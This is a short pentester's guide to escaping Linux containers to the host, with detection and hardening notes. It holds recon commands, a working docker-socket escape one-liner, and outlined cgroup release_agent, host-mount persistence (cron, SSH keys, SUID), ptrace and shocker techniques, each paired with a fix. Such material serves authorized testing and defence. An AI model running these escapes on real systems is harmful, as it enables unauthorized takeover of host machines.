# Linux container escapes

Full writeup: [jperezduerto.info/techniques/linux-container-escapes](https://jperezduerto.info/techniques/linux-container-escapes/)

You have code execution inside a Linux container and want the host. Confirm you
are contained, enumerate the escape surface with built-ins, then take the
documented bridge out. For pentesters, with the detection each leaves. CVE-class
runtime escapes are referenced by name, not carried; the rest are configuration.

`container-recon.sh` runs the read-only "am I contained and what bridges out"
checks.

## Am I in a container

```bash
ls -la /.dockerenv 2>/dev/null
cat /proc/1/cgroup /proc/self/cgroup
grep CapEff /proc/self/status
mount; ls -la /var/run/docker.sock 2>/dev/null
```

## Escape surface

```bash
capsh --decode=$(grep CapEff /proc/self/status | awk '{print $2}') 2>/dev/null
findmnt 2>/dev/null || cat /proc/mounts
ls /proc/1/root 2>/dev/null        # host PID namespace shared?
ls -la /dev | head                 # device access (privileged)
```

A mounted `docker.sock`, a privileged container, `CAP_SYS_ADMIN`, a shared host
PID namespace, or a host dir mounted read-write is a bridge.

## Escapes

- **Mounted docker socket**: `docker -H unix:///var/run/docker.sock run -v /:/host
  --rm -it alpine chroot /host sh`. Fix: never mount `docker.sock` in.
- **Privileged container, cgroup `release_agent`**: mount a cgroup, set
  `notify_on_release`, point `release_agent` at a host path, empty the cgroup to
  run it on the host. Fix: no privileged containers; drop `CAP_SYS_ADMIN`.
- **Host path mounted rw**: write a cron entry, an SSH key into `/root/.ssh`, or
  a SUID binary onto the host. Fix: mount only what is needed, read-only, never
  host-sensitive paths.
- **CAP_SYS_PTRACE + shared host PID ns**: attach to and inject into a host
  process. Fix: do not share host PID ns; drop the capability.
- **CAP_DAC_READ_SEARCH**: open_by_handle_at ("shocker") reads host files. Fix:
  drop the capability.
- **Runtime CVEs** (runc leaky vessels `CVE-2024-21626`, ...): match the runtime
  version to a maintained public exploit. No exploit code here; detect the
  artifacts and patch.

## Detection

Catch it host-side, not from inside the container. [Falco](https://falco.org/)
maps cleanly:

- A container process connecting to `/var/run/docker.sock`, or a new container
  with `/` or a host-sensitive path bind-mounted.
- A container mounting a cgroup or host filesystem, or writing `release_agent` /
  `notify_on_release`.
- A container task spawning or ptracing a host-namespace process, or a host
  process parented by the kernel cgroup release path.
- New `authorized_keys`, cron entries, or SUID binaries on the host tracing back
  to a container mount.

The high-confidence signal is crossing the boundary: a container task causing an
effect in the host namespace.

## Hardening, briefly

No privileged containers; drop all capabilities and add back only what is
needed; never mount `docker.sock` or host-sensitive paths, read-only where you
can; enable user namespaces; keep seccomp and AppArmor/SELinux on; patch the
runtime.

## Use

Authorized and educational use only: your own labs, a cluster you control, or an
engagement with written permission. Enumeration checks and configuration-based
escapes shown with their detection.
